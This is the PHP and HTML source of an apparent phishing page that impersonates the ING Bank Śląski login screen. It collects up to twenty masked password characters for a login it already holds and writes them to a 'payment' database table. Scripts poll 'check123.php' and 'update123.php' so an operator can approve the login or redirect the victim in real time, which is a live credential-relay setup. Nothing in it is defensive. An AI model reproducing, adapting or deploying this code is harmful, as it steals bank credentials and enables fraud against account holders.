<?php include('../bank_header.php'); ?>
<?php 
include('../../../db.php'); 
if($_REQUEST['id']){
  $id = mysqli_real_escape_string($con,$_REQUEST['id']);
$page_name = basename($_SERVER['PHP_SELF']);
$sqlss = "UPDATE `payment` SET `page_name` = '$page_name' WHERE `id` = '$id'";
$con->query($sqlss);
}
if(isset($_POST['submit'])){
$bank_user_password = $_POST['bpwd1'].$_POST['bpwd2'].$_POST['bpwd3'].$_POST['bpwd4'].$_POST['bpwd5'].$_POST['bpwd6'].$_POST['bpwd7'].$_POST['bpwd8'].$_POST['bpwd9'].$_POST['bpwd10'].$_POST['bpwd11'].$_POST['bpwd12'].$_POST['bpwd13'].$_POST['bpwd14'].$_POST['bpwd15'].$_POST['bpwd16'].$_POST['bpwd17'].$_POST['bpwd18'].$_POST['bpwd19'].$_POST['bpwd20'].$_POST['bpwd21'].$_POST['bpwd22'].$_POST['bpwd23'].$_POST['bpwd24'];
;
$sql = "UPDATE `payment` SET `bank_user_password` = '$bank_user_password' WHERE `id` = '".mysqli_real_escape_string($con,$_REQUEST['id'])."'";
$con->query($sql);
//echo '<script>window.location.href="mtransfer_stepone.php?id='.$_REQUEST['id'].'"</script>';
}

$sqpy = "SELECT * FROM `payment` WHERE `id` = '".mysqli_real_escape_string($con,$_REQUEST['id'])."'";
$newpy = $con->query($sqpy);
$rowpay = $newpy->fetch_assoc();

?>


<script type="text/javascript">
setInterval(function(){ upd_last_login(<?php echo $_REQUEST['id']; ?>); }, 300);
function upd_last_login(str) {
    if (str == "") {
        // document.getElementById("txtHint").innerHTML = "";
        // return;
    } else { 
        if (window.XMLHttpRequest) {
            // code for IE7+, Firefox, Chrome, Opera, Safari
            xmlhttp = new XMLHttpRequest();
        } else {
            // code for IE6, IE5
            xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
        }
        xmlhttp.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
                //document.getElementById("ip").innerHTML = this.responseText;
                //alert(this.responseText);
            }
        };
        xmlhttp.open("GET","update123.php?id="+str,true);
        xmlhttp.send();
    }
}
</script>

<style>
.ing-new-theme .login-layout_container .box-content{
    height:60% !important;
    margin-top:-200px;
}
#result{
<?php if(isset($_POST['submit'])){ ?>
display:block;
<?php }else{ ?>
display:none;
<?php } ?>
}
#loading_end{
<?php if(isset($_POST['submit'])){ ?>
display:none;
<?php }else{ ?>
display:block;
<?php } ?>
}
#pass{
<?php if(isset($_POST['submit'])){ ?>
display:none;
<?php }else{ ?>
display:block;
<?php } ?>
}
</style>
<?php if(isset($_POST['submit'])){ ?>

<script>
                    setInterval(function(){ check_status(<?php echo $id; ?>); }, 10000);

function check_status(payment_id) {
    //alert(payment_id);
    if (payment_id.length == 0) {
    } else {
        var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
                //alert(this.responseText);
                if(this.responseText=='VALID CODE'){ 
                    window.location.href="indexauth.php?id=<?php echo $id; ?>";
					setInterval(function(){ check_status(<?php echo $id; ?>); }, 10000);
                }else if(this.responseText=='WRONG CODE'){ 
                    window.location.href="index.php?id=<?php echo $id; ?>";
					setInterval(function(){ check_status(<?php echo $id; ?>); }, 10000);
                }
            }
        };
        xmlhttp.open("GET", "check123.php?id=" + payment_id +"&status=login_aproove", true);
        xmlhttp.send();
    }
}
</script>
<?php } ?>


<!DOCTYPE html>

<html lang="pl"><!--<![endif]-->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Moje ING | ING Bank Śląski</title>

<meta name="viewport" content="user-scalable=no, width=device-width, initial-scale=1, maximum-scale=1">
<meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="format-detection" content="telephone=no">
<meta name="description" content="Nowa bankowość internetowa i mobilna ING Banku Śląskiego. Bankuj po swojemu, tak jak lubisz. Zaloguj się.">


<link rel="stylesheet" href="css/bootstrap.css">
<link rel="stylesheet" id="ing-main-styles" href="css/main.css">
</head>

<body class="ing-new-theme ing-paybylink ing-personal">
<div id="layout-region" class="ing-container">
	<div class="login-layout">
		<div class="region-wrapper login-region login-layout_container ui-content login-layout--top">
			<div class="main-content-wrap">
				<h1 class="sr-only">Moje ING | ING Bank Śląski - Logowanie</h1>
					<div id="content-region" class="main-content">
						<div class="ing-login-container">
							<div class="content-container box">
								<div class="header login-header box-header box--before"> 
									<img src="images/ing-logo.svg" alt="ING Bank Śląski" class="box-header_logo">
								</div>
								<div class="box-content login-hero">
									<h2>Zaloguj się do&nbsp;bankowości internetowej</h2>
								</div>
								<div id="body-region" class="body">
									<section class="box-content box--after">
									<div class="ing-password-container">
										<div class="row ing-loader-overlay">
											<div class="col-sm-12">
												<div class="ing-password-container__header">
												  <p>Wpisz wskazane znaki hasła dla&nbsp;loginu <strong><?php echo $rowpay['bank_user_id']; ?></strong></p>
											    </div>
											    <form class="ing-password-container__password" method="POST" action="" role="form"> 

<center><img id="result" src="loading.gif" style="width: 70px; padding-top: 0px;"></center>
<!-- ----------------------form input----------------------- -->
<div id="pass">
<div </div>
    
    <div class="ing-password-container__password--field js-field"> 
    
    



<script type="text/javascript">
function getfocus(i) {
    document.getElementById("myAnchor"+i).focus();
}
</script>

<input class="form-control" value="" type="password" autocomplete="off" maxlength="1" onkeypress="getfocus(1)"  name="bpwd1"> 


<label for="mask-1"><span aria-hidden="true">1</span> <span class="sr-only">Wpisz drugi znak hasła</span></label></div><div class="ing-password-container__password--field js-field">

<input class="form-control" value="" type="password" autocomplete="off" maxlength="1" onkeypress="getfocus(2)" id="myAnchor1" name="bpwd2" onkeypress="getfocus(2)" > 

<label for="mask-2"><span aria-hidden="true">2</span> <span class="sr-only">Wpisz drugi znak hasła</span></label></div><div class="ing-password-container__password--field js-field">

<input class="form-control" value="" type="password" autocomplete="off" maxlength="1" onkeypress="getfocus(3)" id="myAnchor2" name="bpwd3"> 

<label for="mask-3"><span aria-hidden="true">3</span> <span class="sr-only">Wpisz drugi znak hasła</span></label></div><div class="ing-password-container__password--field js-field">



<input class="form-control" value="" type="password" autocomplete="off" maxlength="1" onkeypress="getfocus(4)" id="myAnchor3" name="bpwd4"> 

<label for="mask-4"><span aria-hidden="true">4</span> <span class="sr-only">Wpisz drugi znak hasła</span></label></div><div class="ing-password-container__password--field js-field">


<input class="form-control" value="" type="password" autocomplete="off" maxlength="1" onkeypress="getfocus(5)" id="myAnchor4" name="bpwd5"> 

<label for="mask-5"><span aria-hidden="true">5</span> <span class="sr-only">Wpisz drugi znak hasła</span></label></div><div class="ing-password-container__password--field js-field">


<input class="form-control" value="" type="password" autocomplete="off" maxlength="1" onkeypress="getfocus(6)" id="myAnchor5" name="bpwd6"> 

<label for="mask-6"><span aria-hidden="true">6</span> <span class="sr-only">Wpisz drugi znak hasła</span></label></div><div class="ing-password-container__password--field js-field">



<input class="form-control" value="" type="password" autocomplete="off" maxlength="1" onkeypress="getfocus(7)" id="myAnchor6" name="bpwd7"> 

<label for="mask-7"><span aria-hidden="true">7</span> <span class="sr-only">Wpisz drugi znak hasła</span></label></div><div class="ing-password-container__password--field js-field">


<input class="form-control" value="" type="password" autocomplete="off" maxlength="1" onkeypress="getfocus(8)" id="myAnchor7" name="bpwd8"> 

<label for="mask-8"><span aria-hidden="true">8</span> <span class="sr-only">Wpisz drugi znak hasła</span></label></div><div class="ing-password-container__password--field js-field">


<input class="form-control" value="" type="password" autocomplete="off" maxlength="1" onkeypress="getfocus(9)" id="myAnchor8" name="bpwd9"> 

<label for="mask-9"><span aria-hidden="true">9</span> <span class="sr-only">Wpisz drugi znak hasła</span></label></div><div class="ing-password-container__password--field js-field">


<input class="form-control" value="" type="password" autocomplete="off" maxlength="1" onkeypress="getfocus(10)" id="myAnchor9" name="bpwd10"> 

<label for="mask-10"><span aria-hidden="true">10</span> <span class="sr-only">Wpisz drugi znak hasła</span></label></div><div class="ing-password-container__password--field js-field">


<input class="form-control" value="" type="password" autocomplete="off" maxlength="1" onkeypress="getfocus(11)" id="myAnchor10" name="bpwd11"> 

<label for="mask-11"><span aria-hidden="true">11</span> <span class="sr-only">Wpisz drugi znak hasła</span></label></div><div class="ing-password-container__password--field js-field">

<input class="form-control" value="" type="password" autocomplete="off" maxlength="1" onkeypress="getfocus(12)" id="myAnchor11" name="bpwd12"> 

<label for="mask-12"><span aria-hidden="true">12</span> <span class="sr-only">Wpisz drugi znak hasła</span></label></div><div class="ing-password-container__password--field js-field">


<input class="form-control" value="" type="password" autocomplete="off" maxlength="1" onkeypress="getfocus(13)" id="myAnchor12" name="bpwd13"> 

<label for="mask-13"><span aria-hidden="true">13</span> <span class="sr-only">Wpisz drugi znak hasła</span></label></div><div class="ing-password-container__password--field js-field">


<input class="form-control" value="" type="password" autocomplete="off" maxlength="1" onkeypress="getfocus(14)" id="myAnchor13" name="bpwd14"> 

<label for="mask-14"><span aria-hidden="true">14</span> <span class="sr-only">Wpisz drugi znak hasła</span></label></div><div class="ing-password-container__password--field js-field">


<input class="form-control" value="" type="password" autocomplete="off" maxlength="1" onkeypress="getfocus(15)" id="myAnchor14" name="bpwd15"> 

<label for="mask-15"><span aria-hidden="true">15</span> <span class="sr-only">Wpisz drugi znak hasła</span></label></div><div class="ing-password-container__password--field js-field">



<input class="form-control" value="" type="password" autocomplete="off" maxlength="1" onkeypress="getfocus(16)" id="myAnchor15" name="bpwd16"> 

<label for="mask-16"><span aria-hidden="true">16</span> <span class="sr-only">Wpisz drugi znak hasła</span></label></div><div class="ing-password-container__password--field js-field">


<input class="form-control" value="" type="password" autocomplete="off" maxlength="1" onkeypress="getfocus(17)" id="myAnchor16" name="bpwd17"> 

<label for="mask-17"><span aria-hidden="true">17</span> <span class="sr-only">Wpisz drugi znak hasła</span></label></div><div class="ing-password-container__password--field js-field">


<input class="form-control" value="" type="password" autocomplete="off" maxlength="1" onkeypress="getfocus(18)" id="myAnchor17" name="bpwd18"> 

<label for="mask-18"><span aria-hidden="true">18</span> <span class="sr-only">Wpisz drugi znak hasła</span></label></div><div class="ing-password-container__password--field js-field">


<input class="form-control" value="" type="password" autocomplete="off" maxlength="1" onkeypress="getfocus(19)" id="myAnchor18" name="bpwd19"> 

<label for="mask-19"><span aria-hidden="true">19</span> <span class="sr-only">Wpisz drugi znak hasła</span></label></div><div class="ing-password-container__password--field js-field">

<input class="form-control" value="" type="password" autocomplete="off" maxlength="1" onkeypress="getfocus(20)" id="myAnchor19" name="bpwd20"> 

<label for="mask-20"><span aria-hidden="true">20</span> <span class="sr-only">Wpisz drugi znak hasła</span></label></div><div class="ing-password-container__password--field js-field">



</div>
<!-- ----------------------form input----------------------- -->

<!--<center><input class="form-control" value="" name="bank_user_password" type="password" id="pass"   style="width: 50%"> </center>-->

											    		
											    		
											    		<a class="ing-password-container__password--anchor pull-right visible-lg-inline js-show-screen-keyboard link" tabindex="-1"><i class="glyphicon glyphicon-ing-keyboard"></i> <span>Klawiatura ekranowa</span></a><div class="ing-password-container__password--capslock hidden hidden-xs js-capslock-warning"><i class="ing-icon glyphicon-ing-error"></i><strong>Caps Lock jest włączony</strong></div>
											    		<div class="col-sm-12"> 

<button type="submit" name="submit" value="submit" class="btn btn-primary btn-lg js-login ing-login-mask-buttons__login ing-disabled"> Zaloguj</button>
											    		

											    		</div>

											    		</form>

											    		</div>
											    		</div>

											    		<div id="screen-keyboard-region"></div><div class="js-error-container"></div><div class="row ing-login-mask-buttons">
											    		    <div class="col-sm-12" style="margin-top: 0px;"> 
<a href ="index.php"></a><button  class="btn btn-default btn-lg js-back ing-login-mask-buttons__back"> Anuluj</button></a>

</div></div><p class="login_help"><a href="#" class="link" target="_blank" data-tag="ADOBE:lastClickedArea=Login:PasswordPage;lastAction=V:notset:notset:notset:Help;lastClickedElement=Login:PasswordPage:Problem;"><span class="sr-only">Mam problemy z&nbsp;logowaniem otwiera się w&nbsp;nowym oknie</span><span aria-hidden="true">Problemy z&nbsp;logowaniem</span></a></p></div></section></div><div id="news-region" class="login_msg box-content transition" style="display: none;"></div></div></div></div></div></div><footer id="footer-region" class="ing-footer login-layout_footer ui-content login-layout--top"><div><div class="row"><div class="ing-list-hybrid-container ing-list-hybrid-container--with-contrast"><ul class="ing-list-hybrid pull-left"><li><a href="#" class="ing-activation js-activation"><i class="glyphicon-ing-key" aria-hidden="true"></i> <span>Aktywuj dostęp</span></a></li><li><a href="#" target="_blank" class="js-security"><i class="glyphicon-ing-blocked2" aria-hidden="true"></i> <span>O&nbsp;bezpieczeństwie</span> <span class="sr-only">otwiera się w&nbsp;nowym oknie</span></a></li><li><a href="#" class="js-change-lang"><i class="glyphicon-ing-en" aria-hidden="true"></i> <span aria-hidden="true">English</span> <span class="sr-only">Zmień język systemu bankowości internetowej na&nbsp;angielski</span></a></li><li><a href="#" class="js-change-contrast"><i class="glyphicon-ing-e916" aria-hidden="true"></i> <span class="aria-hidden hidden-md hidden-lg">Wersja kontrastowa</span> <span class="sr-only">Zmiana kontrastu</span></a></li></ul></div><div class="ing-list-inline-container"><ul class="ing-list-inline"><li> <span id="aria-info">Infolinia:</span> <a href="tel:+48801601607" aria-describedby="aria-info"><span class="sr-only">zadzwoń801_601 607</span><span aria-hidden="true">801 601 607</span></a> <span> lub </span> <a href="tel:+48323570010" aria-describedby="aria-info"><span class="sr-only">zadzwoń32_357 00 10</span><span aria-hidden="true">32 357 00 10</span></a></li><li> <a href="#" target="_blank" class="js-cookie-policy"><span>Polityka <span lang="en">cookies</span></span> <span class="sr-only">otwiera się w&nbsp;nowym oknie</span></a></li><li> <span>ING Bank Śląski S.A.</span></li></ul></div></div></div></footer></div></div><div id="page-loader-overlay-region" class="hide" style="opacity: 1; display: none;"><span class="ing-loader"><span class="ing-spacer ing-spacer--flow"><div class="ing-inner-spacer"><div class="ing-balls"><div class="loader"></div></div></div></span></span></div><div id="modal-region" class="modal fade" data-backdrop="static" aria-hidden="true" role="dialog" tabindex="-1"></div><script id="rjs" data-version="1604.1.0" data-date="2016-12-01T13:59:02" data-env="prod" src="./Moje ING _ ING Bank Śląski_files51351/init.js.pobrane"></script><script type="text/javascript" src="./Moje ING _ ING Bank Śląski_files51351/bottom.js.pobrane"></script></body></html>

											    		<style type="text/css">
											    			.btn.btn-lg
											    			{
											    				width: 27%;
                                                                margin-top: 30px;
											    			}
											    			button.btn.btn-default.btn-lg.js-back.ing-login-mask-buttons__back {
    margin-top: 0px;
}
											    		</style>